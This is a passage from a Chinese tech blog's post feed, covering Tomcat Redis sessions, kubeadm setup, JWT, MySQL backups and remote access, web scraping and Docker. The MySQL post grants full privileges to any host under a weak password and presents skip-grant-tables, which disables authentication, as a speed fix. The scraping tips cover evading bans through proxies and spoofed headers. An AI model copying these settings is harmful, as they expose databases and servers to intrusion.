挂了，那么此时nginx只能把请求交给tomcat_8222,但是这里却没有记录session,用户体验依然受影响。 4.3 解决方法（二）用Redis来存取session. Redis是什么呢？说简单点就是个独立的Hashmap，用来存放键值对的。这样当tomcat1需要保存session值的时候，就可以把它放在Redis上，需要取的时候，也从Redis上取。 那么考虑这个情景： 用户提交账号密码的行为被分配在了tomcat8111上，登陆信息被存放在redis里。 当用户第二次访问的时候，被分配到了tomcat8222上 那么此时tomcat8222就会从redis去获取相关信息，一看有对应信息，那么就会呈现登陆状态。 这样就规避了解决办法一: ip_hash里会出现的两种问题了。 4.3.1 启动redis1.点击下载2.解压3.双击 start.bat 启动 4.3.2 下载jar包Tomcat需要链接 redis，所以需要专门的jar包,这些包都放在了右上角的tomcat-redis.rar里。 一共有3个jar包：jedis-2.5.2.jar，commons-pool2-2.0.jar，tomcat-redis-session-manager1.2.jar。点击 这里下载下载解压后，放在tomat8111的lib目录下。注：不要放在webapp里面去了下载解压后，放在tomat8222的lib目录下。注：不要放在webapp里面去了两个tomcat都要放 4.3.3 修改context.xml文件修改tomcat/conf/context.xml ，增加下面内容 123456&lt;Valve className="com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve" /&gt; &lt;Manager className="com.orangefunction.tomcat.redissessions.RedisSessionManager" host="127.0.0.1" port="6379" database="0" maxInactiveInterval="60" /&gt; 两个tomcat都要改 4.3.4 重启tomcat两个tomcat都要重启 启动完就大功告成了]]></content>
      <categories>
        <category>Java,nginx</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Centos和Ubuntu安装kubeadm]]></title>
    <url>%2F2019%2F05%2F24%2FCentos%E5%92%8CUbuntu%E5%AE%89%E8%A3%85kubeadm%2F</url>
    <content type="text"><![CDATA[必须需要更换kubeadm下载源才能安装到 Centos更换源 12345678910cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOF 安装 1yum install kubeadm Ubuntu更换源 123cat &lt;&lt;EOF &gt; /etc/apt/sources.list.d/kubernetes.listdeb http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial mainEOF 更新系统源 1apt-get update 如果提示签名无法验证，则执行下面语句，将 JC054F7C为你执行时显示出的 NO_PUBKEY 的后八位 12gpg --keyserver keyserver.ubuntu.com --recv-keys JC054F7Cgpg --export --armor BA07F4FB | sudo apt-key add - 再次更新 1apt-get update 安装 1apt-get install kubeadm]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
        <tag>kubeadm</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用java画一张海报]]></title>
    <url>%2F2019%2F05%2F24%2F%E4%BD%BF%E7%94%A8java%E7%94%BB%E4%B8%80%E5%BC%A0%E6%B5%B7%E6%8A%A5%2F</url>
    <content type="text"><![CDATA[PS: 没找到合适的海报背景，就随便找了一张，使用技术都是相同的 1. 添加依赖这俩其实跟本章节的核心技术没有关系，是为了获取QQ昵称和QQ头像而引入的。 123456789101112&lt;!-- jsoup --&gt; &lt;dependency&gt; &lt;groupId&gt;org.jsoup&lt;/groupId&gt; &lt;artifactId&gt;jsoup&lt;/artifactId&gt; &lt;version&gt;1.11.3&lt;/version&gt; &lt;/dependency&gt; &lt;!-- fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.54&lt;/version&gt; &lt;/dependency&gt; talk is cheap， show me the code 2.上代码我就不多说了，注释已经写得很清楚了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169package com.pibgstar.demo.utils;import com.alibaba.fastjson.JSONObject;import org.jsoup.Jsoup;import org.jsoup.nodes.Document;import javax.imageio.ImageIO;import java.awt.*;import java.awt.geom.Ellipse2D;import java.awt.image.BufferedImage;import java.io.File;import java.io.IOException;import java.io.InputStream;import java.net.URL;/** * @author pibigstar * @desc 海报生成工具 **/public class PosterUtil &#123; private static final String BACKGROUND_IMG = "images/bg.jpg"; // 背景图片 private static final String result_img = "D:/tmp/images/result.jpg"; // 最终输出图片 private static final String QQ = "741047261"; private static final String avatar_img = "http://q1.qlogo.cn/g?b=qq&amp;nk="+QQ+"&amp;s=100";//QQ获取头像接口 private static final String signature = "魔前一叩三千年，回首凡尘不做仙。"; // 个性签名 public static void main(String[] args)&#123; drawPoster(); &#125; /** * @Author:pibigstar * @Description: 画海报 */ public static void drawPoster()&#123; try &#123; long startTime = System.currentTimeMillis(); // 1. 创建画布 BufferedImage backgroundImg = ImageIO.read(getInputStream(BACKGROUND_IMG)); BufferedImage canvas = new BufferedImage(backgroundImg.getWidth(),backgroundImg.getHeight(),BufferedImage.TYPE_INT_RGB); Graphics2D g = (Graphics2D) canvas.getGraphics(); // 设置抗锯齿 g.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_LCD_HRGB); // 2. 将头像设置为圆角 BufferedImage avatar = ImageIO.read(new URL(avatar_img)); BufferedImage newAvatar = new BufferedImage(avatar.getWidth(), avatar.getHeight(), BufferedImage.TYPE_INT_ARGB); Ellipse2D.Double shape = new Ellipse2D.Double(0, 0, avatar.getWidth(), avatar.getHeight()); Graphics2D g2 = newAvatar.createGraphics(); newAvatar = g2.getDeviceConfiguration().createCompatibleImage(avatar.getWidth(), avatar.getHeight(), Transparency.TRANSLUCENT); g2 = newAvatar.createGraphics(); g2.setComposite(AlphaComposite.Clear); g2.fill(new Rectangle(newAvatar.getWidth(), newAvatar.getHeight())); g2.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC, 1.0f)); g2.setClip(shape); // 使用 setRenderingHint 设置抗锯齿 g2 = newAvatar.createGraphics(); g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON); g2.fillRoundRect(0, 0,avatar.getWidth(), avatar.getHeight(), 150, 150); g2.setComposite(AlphaComposite.SrcIn); g2.drawImage(avatar, 0, 0, avatar.getWidth(), avatar.getHeight(), null); g2.dispose(); // 3. 将背景图和头像结合 // 画背景 g.drawImage(backgroundImg.getScaledInstance(backgroundImg.getWidth(), backgroundImg.getHeight(), Image.SCALE_DEFAULT), 0, 0, null); // 背景上画头像 g.drawImage(newAvatar.getScaledInstance(100, 100, Image.SCALE_DEFAULT), 42, 35, null); // 4. 写字（昵称） g.setColor(new Color(33, 33, 33, 128)); g.setFont(getFont(2, 32.0f)); g.drawString(getNickName(QQ), 200, 75); // 5. 画个性签名 g.setColor(new Color(33, 33, 33, 128)); g.setFont(getFont(1, 40.0f)); // 画竖着的文字 int x = 240; // 起始位置 int length = signature.length();//字符总长度 int size = length/2; //一竖列的长度 int j = 0; // 读取到那个字符了 for (int i=0; i&lt;2; i++) &#123;//两竖列 int y = 300; for (;j &lt; size; j++) &#123; String c = String.valueOf(signature.charAt(j)); y += 40; g.drawString(c,x,y); &#125; size = length; x += 70;//竖列之间的距离 &#125; g.dispose(); File resultImg = new File(result_img); ImageIO.write(canvas, "png", resultImg); System.out.println("生成成功！"); System.out.println("耗时: " + (System.currentTimeMillis()-startTime)/1000.0 + "s"); System.out.println("生成文件路径: " + resultImg.getAbsolutePath()); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * @Description: 获取QQ昵称，无意间发现的QQ音乐的一个漏洞 */ private static String getNickName(String qq)&#123; String api = "https://c.y.qq.com/rsc/fcgi-bin/fcg_get_profile_homepage.fcg?cid=205360838&amp;ct=20&amp;userid="+qq+"&amp;reqfrom=1"; String nick = ""; JSONObject creatorObject = null; try &#123; Document document = Jsoup.connect(api).ignoreContentType(true).timeout(10000).get(); String body = document.body().text(); JSONObject jsonObject = JSONObject.parseObject(body); JSONObject dataObject = (JSONObject) jsonObject.get("data"); creatorObject = (JSONObject) dataObject.get("creator"); nick = creatorObject.get("nick").toString(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; return nick; &#125; /** * 根据字体类型获取字体 * @param type 字体类型 * @param size 字体大小 */ private static Font getFont(int type, float size) &#123; // 字体路径 String path; switch (type) &#123; case 1: path = "ttf/JianTi.ttf"; break; case 2: path = "ttf/PingFang.ttf"; break; default: path = "ttf/JianTi.ttf"; &#125; InputStream inputStream = null; try &#123; inputStream = getInputStream(path); Font font = Font.createFont(Font.TRUETYPE_FONT, inputStream); font = font.deriveFont(size); return font; &#125; catch (FontFormatException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; if (inputStream != null) &#123; inputStream.close(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; return null; &#125; /** * 获取resources下的文件输入流 */ private static InputStream getInputStream(String fileName) &#123; return PosterUtil.class.getClassLoader().getResourceAsStream(fileName); &#125;&#125; 3. 目录结构 4. 最终效果]]></content>
      <categories>
        <category>Java,java工具类</category>
      </categories>
      <tags>
        <tag>海报</tag>
        <tag>QQ昵称</tag>
        <tag>竖列文字</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java使用Jwt加密信息生成token]]></title>
    <url>%2F2019%2F05%2F21%2FJava%E4%BD%BF%E7%94%A8Jwt%E5%8A%A0%E5%AF%86%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90token%2F</url>
    <content type="text"><![CDATA[1. 添加依赖123456&lt;!-- jwt加密工具类 --&gt;&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt;&lt;/dependency&gt; 2. java代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import io.jsonwebtoken.*;import javax.crypto.spec.SecretKeySpec;import javax.xml.bind.DatatypeConverter;import java.security.Key;import java.util.Date;import java.util.HashMap;import java.util.Map;/** * @author pibigstar * @create 2018-12-13 15:32 * @desc token工具类 **/public class TokenUtil &#123; private static final String SECRET = "rgsnsm#ldyh*ws%l&amp;hdpmnmw@xyhndes";//私密key private static final Long TTL_EXPIRATION = 1000L * 60 * 30; //过期时间30分钟 private static final String ISSUER = "pibigstar";//发行人 /** * 加密信息，生成token */ public static String creatToken(Map&lt;String,Object&gt; params) &#123; SignatureAlgorithm signature = SignatureAlgorithm.HS256; byte[] secretBytes = DatatypeConverter.parseBase64Binary(SECRET); Key secretKey = new SecretKeySpec(secretBytes, signature.getJcaName()); Long expiration = System.currentTimeMillis() + TTL_EXPIRATION; JwtBuilder builder = Jwts.builder() .setIssuedAt(new Date()) .setExpiration(new Date(expiration)) .setIssuer(ISSUER) .setClaims(params) .signWith(signature,secretKey); return builder.compact(); &#125; /** * 解析token */ public static Map&lt;String, Object&gt; parseToken(String token) &#123; Claims claims = null; try &#123; claims = Jwts.parser().setSigningKey(DatatypeConverter.parseBase64Binary(SECRET)) .parseClaimsJws(token).getBody(); &#125; catch (SignatureException | MalformedJwtException e)&#123; System.out.println("token解析失败"); &#125; catch (ExpiredJwtException e) &#123; System.out.println("token已过期"); &#125; return claims; &#125;&#125; 3. 测试12345678public static void main(String[] args)&#123; Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); map.put("pibigstar","测试"); String token = creatToken(map); System.out.println("token:" + token); Map&lt;String, Object&gt; result = parseToken(token); System.out.println(result.get("pibigstar"));&#125;]]></content>
      <categories>
        <category>Java,java工具类,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>jwt</tag>
        <tag>token</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库批量备份与还原]]></title>
    <url>%2F2019%2F05%2F18%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%B9%E9%87%8F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F%2F</url>
    <content type="text"><![CDATA[备份某个数据库备份test数据库 1mysqldump -uroot -p123456 -P3306 test -t &gt; test.sql 备份此链接下所有数据库使用 -A 参数，表示备份所有数据库（结构和数据） 1mysqldump -uroot -p123456 -A &gt; all.sql 备份所有数据库（仅结构）加入-d 参数表示只备份结构 1mysqldump -uroot -p123456 -P3306 -A -d &gt; all.sql 还原数据库先登录进数据库中 1mysql -uroot -p123456 然后执行 1source all.sql]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>数据库备份</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用NetData对服务器性能进行监控]]></title>
    <url>%2F2019%2F05%2F18%2F%E4%BD%BF%E7%94%A8NetData%E5%AF%B9%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%80%A7%E8%83%BD%E8%BF%9B%E8%A1%8C%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[@[TOC]服务器为：CentOS 1. 安装NetData1.安装Netdata需要的基本编译环境安装： 1yum install zlib-devel gcc make git autoconf autogen automake pkgconfig 下载NetData 1wget http://firehol.org/download/netdata/releases/v1.0.0/netdata-1.0.0.tar.gz 解压 1tar -xf netdata-1.0.0.tar.gz 进入到netdata 1cd netdata-1.0.0 执行安装 1./netdata-installer.sh 2. 查看界面浏览器打开：http://你的IP:19999 3. 更改配置1vim /etc/netdata/netdata.conf 4. 启动与关闭 启动netdata服务 1/usr/sbin/netdata 关闭netdata服务 1killall netdata]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>netdata</tag>
        <tag>性能监控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用python做爬虫总结]]></title>
    <url>%2F2019%2F05%2F10%2F%E4%BD%BF%E7%94%A8python%E5%81%9A%E7%88%AC%E8%99%AB%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[[TOC] 1 最基本的抓站12import urllib2 content = urllib2.urlopen('http://XXXX').read() 2 使用代理服务器这在某些情况下比较有用，比如IP被封了，或者比如IP访问的次数受到限制等等。 123456789import urllib2 proxy_support = urllib2.ProxyHandler(&#123;'http':'http://XX.XX.XX.XX:XXXX'&#125;) opener = urllib2.build_opener(proxy_support, urllib2.HTTPHandler) urllib2.install_opener(opener) content = urllib2.urlopen('http://XXXX').read() 3 需要登录的情况登录的情况比较麻烦我把问题拆分一下： 3.1 cookie的处理12345import urllib2, cookielib cookie_support= urllib2.HTTPCookieProcessor(cookielib.CookieJar()) opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler) urllib2.install_opener(opener) content = urllib2.urlopen('http://XXXX').read() 是的没错，如果想同时用代理和cookie，那就加入proxy_support然后operner改为 1opener = urllib2.build_opener(proxy_support, cookie_support, urllib2.HTTPHandler) 3.2 表单的处理登录必要填表，表单怎么填？首先利用工具截取所要填表的内容。比如我一般用firefox+httpfox插件来看看自己到底发送了些什么包这个我就举个例子好了，以verycd为例，先找到自己发的POST请求，以及POST表单项：可以看到verycd的话需要填username,password,continueURI,fk,login_submit这几项，其中fk是随机生成的（其实不太随机，看上去像是把epoch时间经过简单的编码生成的），需要从网页获取，也就是说得先访问一次网页，用正则表达式等工具截取返回数据中的fk项。continueURI顾名思义可以随便写，login_submit是固定的，这从源码可以看出。还有username，password那就很显然了。好的，有了要填写的数据，我们就要生成postdata 123456789101112131415import urllib postdata=urllib.urlencode(&#123; 'username':'XXXXX', 'password':'XXXXX', 'continueURI':'http://www.verycd.com/', 'fk':fk, 'login_submit':'登录' &#125;) # 然后生成http请求，再发送请求：req = urllib2.Request( url = 'http://secure.verycd.com/signin/*/http://www.verycd.com/', data = postdata )result = urllib2.urlopen(req).read() 3.3 伪装成浏览器访问某些网站反感爬虫的到访，于是对爬虫一律拒绝请求。这时候我们需要伪装成浏览器，这可以通过修改http包中的header来实现： 12345678headers = &#123; 'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6' &#125; req = urllib2.Request( url = 'http://secure.verycd.com/signin/*/http://www.verycd.com/', data = postdata, headers = headers ) 3.4 反 ”反盗链”某些站点有所谓的反盗链设置，其实说穿了很简单，就是检查你发送请求的header里面，referer站点是不是他自己，所以我们只需要像3.3一样，把headers的referer改成该网站即可，以黑幕著称地cnbeta为例： 123headers = &#123; 'Referer':'http://www.cnbeta.com/articles' &#125; headers是一个dict数据结构，你可以放入任何想要的header，来做一些伪装。例如，有些自作聪明的网站总喜欢窥人隐私，别人通过代理访问，他偏偏要读取header中的X-Forwarded-For来看看人家的真实IP，没话说，那就直接把X-Forwarde-For改了吧，可以改成随便什么好玩的东东来欺负欺负他，呵呵。 3.5 终极绝招有时候即使做了3.1-3.4，访问还是会被据，那么没办法，老老实实把httpfox中看到的headers全都写上，那一般也就行了。 再不行，那就只能用终极绝招了，selenium直接控制浏览器来进行访问，只要浏览器可以做到的，那么它也可以做到。类似的还有pamie，watir，等等等等。 4 多线程并发抓取单线程太慢的话，就需要多线程了，这里给个简单的线程池模板 这个程序只是简单地打印了1-10，但是可以看出是并发地。 123456789101112131415161718192021222324252627282930from threading import Thread from Queue import Queue from time import sleep #q是任务队列 q = Queue() #NUM是并发线程总数 NUM = 2 #JOBS是有多少任务 JOBS = 10 #具体的处理函数，负责处理单个任务def do_somthing_using(arguments): print arguments #这个是工作进程，负责不断从队列取数据并处理 def working(): while True: arguments = q.get() do_somthing_using(arguments) sleep(1) q.task_done() #fork NUM个线程等待队列 for i in range(NUM): t = Thread(target=working) t.setDaemon(True) t.start() #把JOBS排入队列 for i in range(JOBS): q.put(i) #等待所有JOBS完成 q.join() 5 验证码的处理碰到验证码咋办？这里分两种情况处理： google那种验证码，凉拌 简单的验证码：字符个数有限，只使用了简单的平移或旋转加噪音而没有扭曲的，这种还是有可能可以处理的，一般思路是旋转的转回来，噪音去掉，然后划分单个字符，划分好了以后再通过特征提取的方法(例如PCA)降维并生成特征库，然后把验证码和特征库进行比较。这个比较复杂，一篇博文是说不完的，这里就不展开了，具体做法请弄本相关教科书好好研究一下。 事实上有些验证码还是很弱的，这里就不点名了，反正我通过2的方法提取过准确度非常高的验证码，所以2事实上是可行的。6 gzip/deflate支持现在的网页普遍支持gzip压缩，这往往可以解决大量传输时间，以VeryCD的主页为例，未压缩版本247K，压缩了以后45K，为原来的1/5。这就意味着抓取速度会快5倍。然而python的urllib/urllib2默认都不支持压缩，要返回压缩格式，必须在request的header里面写明’accept-encoding’，然后读取response后更要检查header查看是否有’content-encoding’一项来判断是否需要解码，很繁琐琐碎。如何让urllib2自动支持gzip, defalte呢？其实可以继承BaseHanlder类，然后build_opener的方式来处理：123456789101112131415161718192021222324252627282930313233343536373839404142434445import urllib2 from gzip import GzipFile from StringIO import StringIO class ContentEncodingProcessor(urllib2.BaseHandler): # add headers to requests def http_request(self, req): req.add_header("Accept-Encoding", "gzip, deflate") return req # decode def http_response(self, req, resp): old_resp = resp # gzip if resp.headers.get("content-encoding") == "gzip": gz = GzipFile( fileobj=StringIO(resp.read()), mode="r" ) resp = urllib2.addinfourl(gz, old_resp.headers, old_resp.url, old_resp.code) resp.msg = old_resp.msg # deflate if resp.headers.get("content-encoding") == "deflate": gz = StringIO( deflate(resp.read()) ) resp = urllib2.addinfourl(gz, old_resp.headers, old_resp.url, old_resp.code) resp.msg = old_resp.msg return resp import zlib def deflate(data): try: return zlib.decompress(data, -zlib.MAX_WBITS) except zlib.error: return zlib.decompress(data) # 然后就简单了，encoding_support = ContentEncodingProcessor opener = urllib2.build_opener( encoding_support, urllib2.HTTPHandler ) #直接用opener打开网页，如果服务器支持gzip/defalte则自动解压缩 content = opener.open(url).read() 7 更方便地多线程总结一文的确提及了一个简单的多线程模板，但是那个东东真正应用到程序里面去只会让程序变得支离破碎，不堪入目。在怎么更方便地进行多线程方面我也动了一番脑筋。先想想怎么进行多线程调用最方便呢？ 7.1 用twisted进行异步I/O抓取事实上更高1效的抓取并非一定要用多线程，也可以使用异步I/O法：直接用twisted的getPage方法，然后分别加上异步I/O结束时的callback和errback方法即可。例如可以这么干： 12345678910111213141516171819202122from twisted.web.client import getPage from twisted.internet import reactor links = [ 'http://www.verycd.com/topics/%d/'%i for i in range(5420,5430) ] def parse_page(data,url): print len(data),url def fetch_error(error,url): print error.getErrorMessage(),url # 批量抓取链接 for url in links: getPage(url,timeout=5) .addCallback(parse_page,url) #成功则调用parse_page方法 .addErrback(fetch_error,url) #失败则调用fetch_error方法 reactor.callLater(5, reactor.stop) #5秒钟后通知reactor结束程序 reactor.run() twisted人如其名，写的代码实在是太扭曲了，非正常人所能接受，虽然这个简单的例子看上去还好；每次写twisted的程序整个人都扭曲了，累得不得了，文档等于没有，必须得看源码才知道怎么整，唉不提了。如果要支持gzip/deflate，甚至做一些登陆的扩展，就得为twisted写个新的HTTPClientFactory类诸如此类，我这眉头真是大皱，遂放弃。有毅力者请自行尝试。这篇讲怎么用twisted来进行批量网址处理的文章不错，由浅入深，深入浅出，可以一看。 7.2 设计一个简单的多线程抓取类还是觉得在urllib之类python“本土”的东东里面折腾起来更舒服。试想一下，如果有个Fetcher类，你可以这么调用 12345678f = Fetcher(threads=10) #设定下载线程数为10 for url in urls: f.push(url) #把所有url推入下载队列 while f.taskleft(): #若还有未完成下载的线程 content = f.pop() #从下载完成队列中取出结果 do_with(content) # 处理content内容 这么个多线程调用简单明了，那么就这么设计吧，首先要有两个队列，用Queue搞定，多线程的基本架构也和“技巧总结”一文类似，push方法和pop方法都比较好处理，都是直接用Queue的方法，taskleft则是如果有“正在运行的任务”或者”队列中的任务”则为是，也好办，于是代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import urllib2 from threading import Thread,Lock from Queue import Queue import time class Fetcher: def __init__(self,threads): self.opener = urllib2.build_opener(urllib2.HTTPHandler) self.lock = Lock() #线程锁 self.q_req = Queue() #任务队列 self.q_ans = Queue() #完成队列 self.threads = threads for i in range(threads): t = Thread(target=self.threadget) t.setDaemon(True) t.start() self.running = 0 def __del__(self): #解构时需等待两个队列完成 time.sleep(0.5) self.q_req.join() self.q_ans.join() def taskleft(self): return self.q_req.qsize()+self.q_ans.qsize()+self.running def push(self,req): self.q_req.put(req) def pop(self): return self.q_ans.get() def threadget(self): while True: req = self.q_req.get() with self.lock: #要保证该操作的原子性，进入critical area self.running += 1 try: ans = self.opener.open(req).read() except Exception, what: ans = '' print what self.q_ans.put((req,ans)) with self.lock: self.running -= 1 self.q_req.task_done() time.sleep(0.1) # don't spam if __name__ == "__main__": links = [ 'http://www.verycd.com/topics/%d/'%i for i in range(5420,5430) ] f = Fetcher(threads=10) for url in links: f.push(url) while f.taskleft(): url,content = f.pop() print url,len(content) 8 一些琐碎的经验8.1 连接池：opener.open和urllib2.urlopen一样，都会新建一个http请求。通常情况下这不是什么问题，因为线性环境下，一秒钟可能也就新生成一个请求；然而在多线程环境下，每秒钟可以是几十上百个请求，这么干只要几分钟，正常的有理智的服务器一定会封禁你的。然而在正常的html请求时，保持同时和服务器几十个连接又是很正常的一件事，所以完全可以手动维护一个HttpConnection的池，然后每次抓取时从连接池里面选连接进行连接即可。这里有一个取巧的方法，就是利用squid做代理服务器来进行抓取，则squid会自动为你维护连接池，还附带数据缓存功能，而且squid本来就是我每个服务器上面必装的东东，何必再自找麻烦写连接池呢。 8.2 设定线程的栈大小栈大小的设定将非常显著地影响python的内存占用，python多线程不设置这个值会导致程序占用大量内存，这对openvz的vps来说非常致命。stack_size必须大于32768，实际上应该总要32768*2以上 123from threading import stack_size stack_size(32768*16) 8.3 设置失败后自动重试123456789101112def get(self,req,retries=3): try: response = self.opener.open(req) data = response.read() except Exception , what: print what,req if retries&amp;gt;0: return self.get(req,retries-1) else: print 'GET Failed',req return '' return data 8.4 设置超时123import socket socket.setdefaulttimeout(10) #设置10秒后连接超时 8.5 登陆登陆更加简化了，首先build_opener中要加入cookie支持，参考“总结”一文；如要登陆VeryCD，给Fetcher新增一个空方法login，并在init()中调用，然后继承Fetcher类并override login方法： 123456789def login(self,username,password): import urllib data=urllib.urlencode(&#123;'username':username, 'password':password, 'continue':'http://www.verycd.com/', 'login_submit':u'登录'.encode('utf-8'), 'save_cookie':1,&#125;) url = 'http://www.verycd.com/signin' self.opener.open(url,data).read() 于是在Fetcher初始化时便会自动登录VeryCD网站。]]></content>
      <categories>
        <category>爬虫相关,pyhton</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google搜索技巧]]></title>
    <url>%2F2019%2F05%2F10%2FGoogle%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[inurl：搜索URL网址中包含指定字符串 1inurl:login.php intitle：标题中包含指定的字符串 1intitle:登录 intext： 内容中包含指定的字符串 1intext:登录 site：指定网站，只会在指定网站中查找关键字 1深入理解JVM虚拟机 site:baidu.com filetype：指定文件类型 1深入理解JVM虚拟机 filetype:pdf]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>google</tag>
        <tag>搜索技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux远程连接Mysql配置]]></title>
    <url>%2F2019%2F05%2F05%2FLinux%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Mysql%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Mysql默认root用户只能本地访问，不能远程连接管理mysql数据库，Linux如何开启mysql远程连接？设置步骤如下： 创建远程链接授权用户12# 进入mysql操作命令mysql -h localhost -u root -p 增加pibigstar用户授权访问，密码pibigstar 1GRANT ALL PRIVILEGES ON *.* TO pibigstar@localhost IDENTIFIED BY 'pibigstar' WITH GRANT OPTION; 授与pibigstar用户从任何其它主机发起的访问（通配符％） 1GRANT ALL PRIVILEGES ON *.* TO pibigstar@"%" IDENTIFIED BY 'pibigstar' WITH GRANT OPTION; 上面的执性完成之后，基本上就可以通过用户名 pibigstar 密码 pibigstar 访问了，如果还是不行，查看下面方式来解决 设置防火墙允许3306端口1vi /etc/sysconfig/IPtables 添加 1-A RH-Firewall-1-INPUT -m state –state NEW -m tcp -p tcp –dport 3306 -j ACCEPT 注意：添加在-A RH-Firewall-1-INPUT -j REJECT –reject-with icmp-host-prohibited之前，否则可能导致规则不生效 重启防火墙 1service iptables restart 远程访问mysql速度很慢的解决方法修改/etc/my.cnf或my.ini[mysqld]下添加 12skip-name-resolveskip-grant-tables]]></content>
      <categories>
        <category>数据库,Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker高级使用]]></title>
    <url>%2F2019%2F05%2F05%2Fdocker%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[PS: 你可以把镜像理解为一个Java类，而容器则是这个类创建的一个实例。 查询镜像 12# 搜索跟centos相关的镜像docker search centos 拉取镜像 1docker pull centos 启动容器 1docker run -dit -name 容器名 镜像名 /bin/bash 端口映射 12 #本地端口:容器端口 docker run -dit -p 8080:8080 --name 容器名 镜像名 /bin/bash 进入容器 1docker exec -it 容器名 /bin/bash 查看容器日志 1docker logs -f 容器名 查看容器的IP地址 1docker inspect --format='&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;' 容器名 推送镜像 12# username为你docker账号的用户名docker push username/ubuntu:17.10 查看容器信息 1docker inspect 容器名 删除全部容器 1docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq) 删除镜像 1docker rmi 镜像id 创建一个docker网络 1docker network create -d bridge my-net 运行一个容器并连接到新建的网络 1docker run -it --name 容器名 --network my-net 镜像名 /bin/bash 挂载本地目录 12# 将当前目录，挂载到容器的/app/demo目录中 docker run -it -d --name 容器名 -v ./:/app/demo 镜像名 /bin/bash 保存镜像 1docker save alpine | gzip &gt; alpine-latest.tar.gz 加载保存的镜像 1docker load -i alpine-latest.tar.gz 导出容器 1docker export 7691a814370e &gt; ubuntu.tar 从容器快照中导入为镜像 1cat ubuntu.tar | docker import - test/ubuntu:v1.0 清理所有处于终止状态的容器 1docker prune]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以生活的例子来解释编程中的名词]]></title>
    <url>%2F2019%2F05%2F02%2F%E4%BB%A5%E7%94%9F%E6%B4%BB%E7%9A%84%E4%BE%8B%E5%AD%90%E6%9D%A5%E8%A7%A3%E9%87%8A%E7%BC%96%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%90%8D%E8%AF%8D%2F</url>
